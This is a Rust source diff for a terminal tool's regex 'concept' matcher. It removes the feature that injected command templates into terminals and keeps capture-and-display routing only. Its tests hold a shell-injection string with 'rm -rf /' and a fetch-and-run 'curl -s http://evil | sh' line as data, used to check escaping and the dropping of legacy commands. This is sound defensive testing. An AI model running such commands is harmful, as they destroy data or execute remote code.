@@ -1,168 +1,47 @@
-//! Concept matching — the "If This, Then That" brain.
+//! Concept matching — regex triggers over terminal output that route a
+//! captured block of output to a pane.
 //!
 //! Every line of terminal output is tested against every registered
-//! [`Concept`]'s regex trigger. When a match is found, an [`Event`] is
-//! broadcast on the pub-sub channel, and terminals with matching labels
-//! receive the associated [`Action`] commands.
+//! [`Concept`]'s regex trigger. The first enabled concept that matches
+//! starts a capture in the engine; the captured text is later delivered to
+//! the pane kind named by the concept's [`Action::target_label`]. A concept
+//! never injects input into a PTY — capture and display only.
 //!
 //! These are **pure functions** — no I/O, no async, no channels. They are
 //! called from the engine's terminal tasks.
 
-use tokio::sync::broadcast;
-
-use crate::types::{CaptureMode, Concept, Event};
+use crate::types::{CaptureMode, Concept};
 
 /// Test every concept's regex against `line`.
 ///
-/// For each match, broadcast an [`Event`] on the channel.
-///
-/// Returns the name and capture mode of the first matching concept
-/// that has a non-`SingleLine` capture mode, so the engine can enter
-/// capture state. Disabled concepts are skipped entirely.
-pub fn match_and_broadcast(
-    source_id: u32,
-    concepts: &[Concept],
-    tx: &broadcast::Sender<Event>,
-    line: &str,
-) -> Option<(String, CaptureMode, String)> {
-    let mut capture = None;
+/// Returns the name, capture mode, and target label of the first enabled
+/// concept that matches, so the engine can enter capture state. Later
+/// concepts are not evaluated: one trigger, one capture. Disabled concepts
+/// are skipped entirely.
+pub fn match_line(concepts: &[Concept], line: &str) -> Option<(String, CaptureMode, String)> {
     for concept in concepts {
         if !concept.enabled {
             continue;
         }
-        if let Some(caps) = concept.trigger_regex.captures(line) {
-            let mut captures = Vec::with_capacity(caps.len());
-            for c in caps.iter() {
-                captures.push(c.map(|m| m.as_str().to_string()).unwrap_or_default());
-            }
-            let ev = Event {
-                topic: concept.name.clone(),
-                payload: line.to_string(),
-                source_pane: source_id,
-                captures,
-            };
-            let _ = tx.send(ev);
-            // Only the first capture-mode concept wins
-            if capture.is_none() && concept.capture_mode != CaptureMode::SingleLine {
-                let target = concept
-                    .destinations
-                    .first()
-                    .map(|a| a.target_label.clone())
-                    .unwrap_or_default();
-                capture = Some((concept.name.clone(), concept.capture_mode, target));
-            }
+        if concept.trigger_regex.is_match(line) {
+            let target = concept
+                .destinations
+                .first()
+                .map(|a| a.target_label.clone())
+                .unwrap_or_default();
+            return Some((concept.name.clone(), concept.capture_mode, target));
         }
     }
-    capture
-}
-
-/// Given an incoming event, return the commands whose destination labels
-/// match this terminal.
-///
-/// This is called from the terminal that **receives** the event (the
-/// "Then That" side).
-///
-/// # Self-reaction prevention
-///
-/// If `my_id == event.source_pane`, returns an empty vector. This prevents
-/// infinite feedback loops where a terminal's own output triggers a concept
-/// that injects a command back into itself.
-pub fn matching_commands(
-    my_id: u32,
-    my_labels: &[String],
-    concepts: &[Concept],
-    event: &Event,
-) -> Vec<String> {
-    if event.source_pane == my_id {
-        return Vec::new();
-    }
-    let mut commands = Vec::new();
-    for concept in concepts.iter().filter(|c| c.name == event.topic) {
-        for action in &concept.destinations {
-            if my_labels.contains(&action.target_label) {
-                let cmd =
-                    substitute_template(&action.command_template, &event.payload, &event.captures);
-                if !cmd.is_empty() {
-                    commands.push(cmd);
-                }
-            }
-        }
-    }
-    commands
-}
-
-/// Quote a value for safe interpolation into a command that will be typed
-/// into a PTY. Substituted values come from untrusted terminal output and
-/// must never reach the shell unescaped.
-///
-/// Uses POSIX single-quote quoting (`'` → `'\''`), which sh, bash, zsh,
-/// and fish all parse identically. Control characters are replaced with
-/// spaces first. Empty values become `''`.
-fn shell_quote(value: &str) -> String {
-    let sanitized: String = value
-        .chars()
-        .map(|c| if c.is_control() { ' ' } else { c })
-        .collect();
-    if sanitized.is_empty() {
-        return "''".to_string();
-    }
-    format!("'{}'", sanitized.replace('\'', "'\\''"))
-}
-
-/// Substitute `{payload}` and `{N}` capture tokens in a concept command
-/// template. Every substituted value is shell-quoted via [`shell_quote`].
-///
-/// Single pass: substituted values are never re-scanned, so payload text
-/// containing `{0}` cannot trigger a second substitution. `{{` emits a
-/// literal `{`; tokens for missing capture groups are removed; any other
-/// `{` is kept as-is.
-pub fn substitute_template(template: &str, payload: &str, captures: &[String]) -> String {
-    let mut out = String::with_capacity(template.len() + 16);
-    let mut i = 0usize;
-    while i < template.len() {
-        let rest = &template[i..];
-        if !rest.starts_with('{') {
-            let c = rest.chars().next().expect("non-empty rest");
-            out.push(c);
-            i += c.len_utf8();
-            continue;
-        }
-        let after = &template[i + 1..];
-        if after.starts_with("payload}") {
-            out.push_str(&shell_quote(payload));
-            i += 1 + "payload}".len();
-        } else if after.starts_with('{') {
-            out.push('{');
-            i += 2;
-        } else if let Some(close) = after.find('}') {
-            let digits = &after[..close];
-            if !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit()) {
-                if let Ok(n) = digits.parse::<usize>()
-                    && n < captures.len()
-                {
-                    out.push_str(&shell_quote(&captures[n]));
-                }
-                i += 1 + close + 1;
-            } else {
-                out.push('{');
-                i += 1;
-            }
-        } else {
-            out.push('{');
-            i += 1;
-        }
-    }
-    out
+    None
 }
 
 /// Caps applied when parsing concept definitions from JSON.
 ///
 /// Concepts arrive from user-editable config files (`user://concepts.json`)
-/// and are matched against every line of terminal output — unbounded
-/// counts, regexes, command sizes, or capture timeouts would be DoS vectors.
+/// and their triggers are matched against every line of terminal output —
+/// unbounded counts, regexes, or capture timeouts would be DoS vectors.
 pub const MAX_CONCEPTS: usize = 128;
 pub const MAX_TRIGGER_LEN: usize = 1024;
-pub const MAX_CMD_LEN: usize = 4096;
 pub const MAX_ACTIONS: usize = 32;
 pub const MAX_STOP_TIMEOUT_MS: u64 = 600_000;
 
@@ -199,31 +78,27 @@ pub fn concepts_from_json(json: &str) -> Vec<Concept> {
             continue;
         };
         let enabled = item["enabled"].as_bool().unwrap_or(true);
-        let cap_mode = match item["capture_mode"].as_str() {
-            Some("until_stop") => {
-                let stop_ms = item["stop_timeout_ms"]
-                    .as_u64()
-                    .unwrap_or(300)
-                    .clamp(1, MAX_STOP_TIMEOUT_MS);
-                let stop_input = item["stop_on_input"].as_bool().unwrap_or(true);
-                CaptureMode::UntilStop {
-                    stop_timeout_ms: stop_ms,
-                    stop_on_input: stop_input,
-                }
-            }
-            _ => CaptureMode::SingleLine,
+        // Every concept captures until a stop condition. The legacy
+        // `capture_mode` key is ignored (a `single_line` concept used to
+        // mean "inject a command"; that capability is gone), but the stop
+        // knobs are still read so existing files keep their timeouts.
+        let stop_ms = item["stop_timeout_ms"]
+            .as_u64()
+            .unwrap_or(300)
+            .clamp(1, MAX_STOP_TIMEOUT_MS);
+        let stop_input = item["stop_on_input"].as_bool().unwrap_or(true);
+        let cap_mode = CaptureMode::UntilStop {
+            stop_timeout_ms: stop_ms,
+            stop_on_input: stop_input,
         };
+        // Only the routing target is read. A legacy `cmd` key is ignored —
+        // concept definitions are data, never something to execute.
         let mut actions = Vec::new();
         if let Some(acts) = item["actions"].as_array() {
             for a in acts {
-                let cmd = a["cmd"].as_str().unwrap_or("").to_string();
-                if cmd.len() > MAX_CMD_LEN {
-                    continue;
-                }
                 let target = a["target"].as_str().unwrap_or("").to_string();
                 if !target.is_empty() {
                     actions.push(Action {
-                        command_template: cmd,
                         target_label: target,
                     });
                 }
@@ -251,145 +126,40 @@ pub fn concepts_from_json(json: &str) -> Vec<Concept> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use crate::types::{Action, CaptureMode};
+    use crate::types::Action;
     use regex::Regex;
 
-    fn make_concept(name: &str, pattern: &str, target_label: &str, cmd: &str) -> Concept {
+    fn make_concept(name: &str, pattern: &str, target: &str) -> Concept {
         Concept {
             name: name.into(),
             trigger_regex: Regex::new(pattern).unwrap(),
             enabled: true,
-            capture_mode: CaptureMode::SingleLine,
+            capture_mode: CaptureMode::UntilStop {
+                stop_timeout_ms: 300,
+                stop_on_input: true,
+            },
             destinations: vec![Action {
-                command_template: cmd.into(),
-                target_label: target_label.into(),
+                target_label: target.into(),
             }],
         }
     }
 
-    fn make_event(topic: &str, source: u32) -> Event {
-        Event {
-            topic: topic.into(),
-            payload: "test".into(),
-            source_pane: source,
-            captures: vec![],
-        }
-    }
-
-    // ── matching_commands ──────────────────────────────────────────
+    // ── match_line ─────────────────────────────────────────────────
 
     #[test]
-    fn matching_commands_self_reaction_prevented() {
-        let concepts = vec![make_concept("crash", "crash", "backend", "restart")];
-        let event = make_event("crash", 1);
-        let labels = vec!["backend".to_string()];
-        let cmds = matching_commands(1, &labels, &concepts, &event);
-        assert!(cmds.is_empty(), "self-reaction should return empty");
+    fn match_line_no_match_returns_none() {
+        let concepts = vec![make_concept("crash", "crash", "x")];
+        assert!(match_line(&concepts, "all good").is_none());
     }
 
     #[test]
-    fn matching_commands_label_match() {
-        let concepts = vec![make_concept("crash", "crash", "backend", "restart")];
-        let event = make_event("crash", 1);
-        let labels = vec!["backend".to_string()];
-        let cmds = matching_commands(2, &labels, &concepts, &event);
-        assert_eq!(cmds, vec!["restart"]);
-    }
-
-    #[test]
-    fn matching_commands_label_mismatch() {
-        let concepts = vec![make_concept("crash", "crash", "backend", "restart")];
-        let event = make_event("crash", 1);
-        let labels = vec!["inspector".to_string()];
-        let cmds = matching_commands(2, &labels, &concepts, &event);
-        assert!(cmds.is_empty());
-    }
-
-    #[test]
-    fn matching_commands_multiple_actions() {
-        let concepts = vec![Concept {
-            name: "crash".into(),
-            trigger_regex: Regex::new("crash").unwrap(),
-            enabled: true,
-            capture_mode: CaptureMode::SingleLine,
-            destinations: vec![
-                Action {
-                    command_template: "a".into(),
-                    target_label: "x".into(),
-                },
-                Action {
-                    command_template: "b".into(),
-                    target_label: "y".into(),
-                },
-            ],
-        }];
-        let event = make_event("crash", 1);
-        let labels = vec!["x".to_string(), "y".to_string()];
-        let cmds = matching_commands(2, &labels, &concepts, &event);
-        assert_eq!(cmds, vec!["a", "b"]);
-    }
-
-    // ── match_and_broadcast ────────────────────────────────────────
-
-    #[test]
-    fn match_and_broadcast_no_match() {
-        let concepts = vec![make_concept("crash", "crash", "x", "cmd")];
-        let (tx, mut rx) = broadcast::channel(8);
-        match_and_broadcast(1, &concepts, &tx, "all good");
-        assert!(rx.try_recv().is_err());
-    }
-
-    #[test]
-    fn match_and_broadcast_hit() {
-        let concepts = vec![make_concept("crash", "(?i)crash|panic", "x", "cmd")];
-        let (tx, mut rx) = broadcast::channel(8);
-        match_and_broadcast(1, &concepts, &tx, "system panic!");
-        let ev = rx.try_recv().expect("should have received event");
-        assert_eq!(ev.topic, "crash");
-        assert_eq!(ev.source_pane, 1);
-    }
-
-    #[test]
-    fn match_and_broadcast_multiple_concepts() {
-        let concepts = vec![
-            make_concept("a", "alpha", "x", "cmd_a"),
-            make_concept("b", "beta", "x", "cmd_b"),
-        ];
-        let (tx, mut rx) = broadcast::channel(8);
-        match_and_broadcast(1, &concepts, &tx, "beta release");
-        let ev = rx.try_recv().expect("should have one event");
-        assert_eq!(ev.topic, "b");
-        assert!(rx.try_recv().is_err());
-    }
-
-    #[test]
-    fn match_and_broadcast_skips_disabled() {
-        let mut c = make_concept("crash", "crash", "x", "cmd");
-        c.enabled = false;
-        let concepts = vec![c];
-        let (tx, mut rx) = broadcast::channel(8);
-        match_and_broadcast(1, &concepts, &tx, "crash detected");
-        assert!(
-            rx.try_recv().is_err(),
-            "disabled concept should not broadcast"
-        );
-    }
-
-    #[test]
-    fn match_and_broadcast_returns_capture_mode() {
-        let mut c = make_concept("cat_cmd", "cat", "code_viewer", "");
-        c.capture_mode = CaptureMode::UntilStop {
-            stop_timeout_ms: 300,
-            stop_on_input: true,
-        };
-        let concepts = vec![c];
-        let (tx, _rx) = broadcast::channel(8);
-        let result = match_and_broadcast(1, &concepts, &tx, "cat file.txt");
-        assert!(
-            result.is_some(),
-            "UntilStop concept should return capture info"
-        );
-        let (name, mode, target) = result.unwrap();
+    fn match_line_returns_name_mode_and_target() {
+        let concepts = vec![make_concept(
+            "cat_cmd",
+            r"(?:^|[$#>]\s)\bcat\s+\S",
+            "code_viewer",
+        )];
+        let (name, mode, target) = match_line(&concepts, "> cat file.txt").expect("should match");
         assert_eq!(name, "cat_cmd");
         assert_eq!(target, "code_viewer");
         assert_eq!(
@@ -402,92 +172,29 @@ mod tests {
     }
 
     #[test]
-    fn match_and_broadcast_singleline_returns_none() {
-        let concepts = vec![make_concept("crash", "crash", "x", "cmd")];
-        let (tx, _rx) = broadcast::channel(8);
-        let result = match_and_broadcast(1, &concepts, &tx, "crash detected");
-        assert!(
-            result.is_none(),
-            "SingleLine concept should not trigger capture"
-        );
-    }
-
-    // ── substitute_template ───────────────────────────────────────
-
-    #[test]
-    fn substitute_template_quotes_payload() {
-        let caps = vec!["m".to_string()];
-        assert_eq!(
-            substitute_template("echo {payload}", "hello world", &caps),
-            "echo 'hello world'"
-        );
+    fn match_line_first_match_wins() {
+        let concepts = vec![
+            make_concept("a", "alpha", "x"),
+            make_concept("b", "alpha", "y"),
+        ];
+        let (name, _, target) = match_line(&concepts, "alpha release").expect("should match");
+        assert_eq!(name, "a");
+        assert_eq!(target, "x");
     }
 
     #[test]
-    fn substitute_template_escapes_embedded_quote() {
-        let caps = Vec::new();
-        assert_eq!(
-            substitute_template("echo {payload}", "x'; rm -rf /; echo '", &caps),
-            r#"echo 'x'\''; rm -rf /; echo '\'''"#
-        );
+    fn match_line_skips_disabled() {
+        let mut c = make_concept("off", "crash", "x");
+        c.enabled = false;
+        assert!(match_line(&[c], "crash detected").is_none());
     }
 
     #[test]
-    fn substitute_template_double_brace_is_literal() {
-        let caps = Vec::new();
-        assert_eq!(
-            substitute_template("echo {{hello", "x", &caps),
-            "echo {hello"
-        );
-    }
-
-    #[test]
-    fn substitute_template_missing_capture_removed() {
-        let caps = vec!["m".to_string()];
-        assert_eq!(substitute_template("echo {5}", "x", &caps), "echo ");
-    }
-
-    #[test]
-    fn substitute_template_is_single_pass() {
-        // Payload containing {0} must not be re-scanned and re-substituted.
-        let caps = vec!["m".to_string(), "g1".to_string()];
-        assert_eq!(
-            substitute_template("echo {payload}", "a{0}b", &caps),
-            "echo 'a{0}b'"
-        );
-    }
-
-    #[test]
-    fn substitute_template_empty_payload_is_quoted() {
-        let caps = Vec::new();
-        assert_eq!(substitute_template("echo {payload}", "", &caps), "echo ''");
-    }
-
-    #[test]
-    fn substitute_template_sanitizes_control_chars() {
-        let caps = Vec::new();
-        assert_eq!(
-            substitute_template("echo {payload}", "a\x1bb", &caps),
-            "echo 'a b'"
-        );
-    }
-
-    #[test]
-    fn substitute_template_capture_groups() {
-        let caps = vec!["full".to_string(), "one".to_string(), "two".to_string()];
-        assert_eq!(
-            substitute_template("cmd {0} {1} {2}", "p", &caps),
-            "cmd 'full' 'one' 'two'"
-        );
-    }
-
-    #[test]
-    fn substitute_template_stray_brace_kept() {
-        let caps = Vec::new();
-        assert_eq!(
-            substitute_template("echo {notatoken}", "x", &caps),
-            "echo {notatoken}"
-        );
+    fn match_line_without_destination_reports_empty_target() {
+        let mut c = make_concept("c", "crash", "unused");
+        c.destinations.clear();
+        let (_, _, target) = match_line(&[c], "crash").expect("should match");
+        assert_eq!(target, "");
     }
 
     // ── concepts_from_json ────────────────────────────────────────
@@ -503,12 +210,61 @@ mod tests {
         let json = r#"[
             {"name": "", "trigger": "x"},
             {"name": "ok", "trigger": "("},
-            {"name": "good", "trigger": "^cat", "capture_mode": "until_stop",
-             "actions": [{"cmd": "", "target": "code_viewer"}]}
+            {"name": "good", "trigger": "^cat",
+             "actions": [{"target": "code_viewer"}]}
         ]"#;
         let concepts = concepts_from_json(json);
         assert_eq!(concepts.len(), 1);
         assert_eq!(concepts[0].name, "good");
+    }
+
+    /// A concept file is data, never a command: a legacy `cmd` key must not
+    /// survive parsing into the engine's vocabulary.
+    #[test]
+    fn concepts_from_json_ignores_legacy_command_templates() {
+        let json = r#"[
+            {"name": "x", "trigger": "boom",
+             "actions": [{"cmd": "curl -s http://evil | sh", "target": "code_viewer"}]}
+        ]"#;
+        let concepts = concepts_from_json(json);
+        assert_eq!(concepts.len(), 1);
+        assert_eq!(concepts[0].destinations.len(), 1);
+        assert_eq!(concepts[0].destinations[0].target_label, "code_viewer");
+    }
+
+    /// Legacy `single_line` concepts used to mean "inject a command". They
+    /// now capture like every other concept rather than doing nothing.
+    #[test]
+    fn concepts_from_json_legacy_single_line_becomes_capture() {
+        let json = r#"[
+            {"name": "c", "trigger": "x", "capture_mode": "single_line",
+             "actions": [{"target": "inspector"}]}
+        ]"#;
+        let concepts = concepts_from_json(json);
+        assert_eq!(concepts.len(), 1);
+        assert_eq!(
+            concepts[0].capture_mode,
+            CaptureMode::UntilStop {
+                stop_timeout_ms: 300,
+                stop_on_input: true,
+            }
+        );
+    }
+
+    #[test]
+    fn concepts_from_json_applies_stop_knobs() {
+        let json = r#"[
+            {"name": "c", "trigger": "x", "capture_mode": "until_stop",
+             "stop_timeout_ms": 600, "stop_on_input": false}
+        ]"#;
+        let concepts = concepts_from_json(json);
+        assert_eq!(
+            concepts[0].capture_mode,
+            CaptureMode::UntilStop {
+                stop_timeout_ms: 600,
+                stop_on_input: false,
+            }
+        );
     }
 
     #[test]
@@ -529,14 +285,10 @@ mod tests {
              "stop_timeout_ms": 4000000000}
         ]"#;
         let concepts = concepts_from_json(json);
-        match concepts[0].capture_mode {
-            CaptureMode::UntilStop {
-                stop_timeout_ms, ..
-            } => {
-                assert_eq!(stop_timeout_ms, MAX_STOP_TIMEOUT_MS);
-            }
-            _ => panic!("expected until_stop capture mode"),
-        }
+        let CaptureMode::UntilStop {
+            stop_timeout_ms, ..
+        } = concepts[0].capture_mode;
+        assert_eq!(stop_timeout_ms, MAX_STOP_TIMEOUT_MS);
     }
 
     #[test]
@@ -560,20 +312,28 @@ mod tests {
     }
 
     #[test]
-    fn concepts_from_json_caps_cmd_and_actions() {
-        let long_cmd = "x".repeat(MAX_CMD_LEN + 1);
+    fn concepts_from_json_caps_actions() {
         let mut acts = String::new();
         for i in 0..(MAX_ACTIONS + 10) {
             if i > 0 {
                 acts.push(',');
             }
-            acts.push_str(&format!(r#"{{"cmd": "e{i}", "target": "t"}}"#));
+            acts.push_str(&format!(r#"{{"target": "t{i}"}}"#));
         }
-        let json = format!(
-            r#"[{{"name": "c", "trigger": "x", "actions": [{{"cmd": "{long_cmd}", "target": "t"}}, {acts}]}}]"#
-        );
+        let json = format!(r#"[{{"name": "c", "trigger": "x", "actions": [{acts}]}}]"#);
         let concepts = concepts_from_json(&json);
         assert_eq!(concepts[0].destinations.len(), MAX_ACTIONS);
-        assert_eq!(concepts[0].destinations[0].command_template, "e0");
+        assert_eq!(concepts[0].destinations[0].target_label, "t0");
+    }
+
+    #[test]
+    fn concepts_from_json_skips_empty_and_non_string_targets() {
+        let json = r#"[
+            {"name": "c", "trigger": "x",
+             "actions": [{"target": ""}, {"target": 7}, {"target": "ok"}]}
+        ]"#;
+        let concepts = concepts_from_json(json);
+        assert_eq!(concepts[0].destinations.len(), 1);
+        assert_eq!(concepts[0].destinations[0].target_label, "ok");
     }
 }
